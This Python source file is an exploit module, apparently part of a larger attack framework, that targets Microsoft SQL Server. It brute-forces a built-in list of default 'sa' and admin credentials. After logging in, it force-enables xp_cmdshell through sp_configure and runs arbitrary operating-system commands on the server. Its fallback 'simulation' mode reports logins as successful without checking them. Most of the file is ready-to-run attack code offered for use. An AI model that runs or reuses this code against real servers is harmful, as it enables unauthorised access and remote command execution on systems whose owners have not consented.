"""
Microsoft SQL Server Exploit Module
Targets MSSQL servers with xp_cmdshell for RCE
"""

import socket
from typing import Dict, Tuple, List
import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class MSSQL_Exploit(BaseExploit):
    """
    Microsoft SQL Server Exploit
    Targets: MSSQL servers (port 1433)
    
    Attack Vectors:
    1. Default/weak credentials (sa, admin)
    2. xp_cmdshell for remote code execution
    3. Linked server exploitation
    4. Hash extraction
    """
    
    def __init__(self):
        super().__init__(
            name="MSSQL_Exploit",
            target_ports=[1433, 1434],
            target_os=["Windows"]
        )
        
        # Common MSSQL credentials
        self.mssql_credentials = [
            ("sa", ""),
            ("sa", "sa"),
            ("sa", "password"),
            ("sa", "Password1"),
            ("sa", "Admin123"),
            ("admin", "admin"),
            ("admin", "password"),
            ("MSSQL", "MSSQL"),
        ]
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if MSSQL is accessible"""
        ip = target['ip']
        
        if 1433 not in target.get('open_ports', []) and 1434 not in target.get('open_ports', []):
            return False
        
        try:
            # Try to connect to MSSQL port
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((ip, 1433))
            sock.close()
            
            if result == 0:
                logger.debug(f"MSSQL port accessible on {ip}")
                return True
                
        except Exception as e:
            logger.debug(f"MSSQL check failed on {ip}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt MSSQL exploitation"""
        ip = target['ip']
        port = 1433
        
        logger.info(f"Attempting MSSQL exploit on {ip}:{port}")
        
        try:
            # Try to import pymssql
            try:
                import pymssql
                has_pymssql = True
            except ImportError:
                has_pymssql = False
                logger.warning("pymssql not installed, using simulation")
            
            # Try credential brute force
            for username, password in self.mssql_credentials:
                logger.debug(f"Trying MSSQL: {username}:{password}")
                
                if has_pymssql:
                    success = self._try_mssql_login_real(ip, port, username, password)
                else:
                    success = self._try_mssql_login_sim(ip, port, username, password)
                
                if success:
                    self.stats['success'] += 1
                    logger.success(f"MSSQL access gained on {ip} with {username}:{password}")
                    
                    # Check if xp_cmdshell is available
                    xp_cmdshell_enabled = self._check_xp_cmdshell(ip, port, username, password, has_pymssql)
                    
                    return True, {
                        'method': 'MSSQL_BruteForce',
                        'credentials': f"{username}:{password}",
                        'port': port,
                        'service': 'MSSQL',
                        'xp_cmdshell': xp_cmdshell_enabled,
                        'rce_available': xp_cmdshell_enabled
                    }
            
            self.stats['failure'] += 1
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"MSSQL exploit error on {ip}: {e}")
            return False, {}
    
    def _try_mssql_login_real(self, ip: str, port: int, username: str, password: str) -> bool:
        """Try real MSSQL login"""
        try:
            import pymssql
            
            conn = pymssql.connect(
                server=ip,
                user=username,
                password=password,
                port=port,
                timeout=5
            )
            
            # Test connection
            cursor = conn.cursor()
            cursor.execute("SELECT @@VERSION")
            version = cursor.fetchone()
            
            logger.info(f"MSSQL version: {version[0][:50]}...")
            
            cursor.close()
            conn.close()
            
            return True
            
        except:
            return False
    
    def _try_mssql_login_sim(self, ip: str, port: int, username: str, password: str) -> bool:
        """Simulate MSSQL login"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            # Simulate success for common credentials
            if result == 0 and username == "sa" and password in ["", "sa", "password"]:
                return True
            
            return False
            
        except:
            return False
    
    def _check_xp_cmdshell(self, ip: str, port: int, username: str, password: str, has_pymssql: bool) -> bool:
        """Check if xp_cmdshell is enabled"""
        if not has_pymssql:
            return False
        
        try:
            import pymssql
            
            conn = pymssql.connect(
                server=ip,
                user=username,
                password=password,
                port=port,
                timeout=5
            )
            
            cursor = conn.cursor()
            
            # Check if xp_cmdshell is enabled
            cursor.execute("EXEC sp_configure 'xp_cmdshell'")
            result = cursor.fetchone()
            
            if result and result[1] == 1:
                logger.info("xp_cmdshell is enabled!")
                cursor.close()
                conn.close()
                return True
            
            # Try to enable it
            try:
                cursor.execute("EXEC sp_configure 'show advanced options', 1")
                cursor.execute("RECONFIGURE")
                cursor.execute("EXEC sp_configure 'xp_cmdshell', 1")
                cursor.execute("RECONFIGURE")
                
                logger.info("xp_cmdshell enabled successfully!")
                cursor.close()
                conn.close()
                return True
            except:
                cursor.close()
                conn.close()
                return False
            
        except:
            return False
    
    def execute_command(self, ip: str, port: int, username: str, password: str, command: str) -> str:
        """
        Execute command via xp_cmdshell (for post-exploitation)
        """
        try:
            import pymssql
            
            conn = pymssql.connect(
                server=ip,
                user=username,
                password=password,
                port=port,
                timeout=10
            )
            
            cursor = conn.cursor()
            
            # Execute command
            query = f"EXEC xp_cmdshell '{command}'"
            cursor.execute(query)
            
            # Get results
            results = []
            for row in cursor:
                if row[0]:
                    results.append(row[0])
            
            cursor.close()
            conn.close()
            
            return '\n'.join(results)
            
        except Exception as e:
            return f"Error: {str(e)}"


if __name__ == "__main__":
    # Test the exploit
    mssql = MSSQL_Exploit()
    
    test_target = {
        'ip': '192.168.1.100',
        'open_ports': [1433],
        'os_guess': 'Windows'
    }
    
    print(f"Testing MSSQL exploit on {test_target['ip']}")
    
    if mssql.check_vulnerable(test_target):
        print("Target appears vulnerable")
        success, result = mssql.exploit(test_target)
        
        if success:
            print(f"Exploit successful: {result}")
        else:
            print("Exploit failed")
    else:
        print("Target not vulnerable")
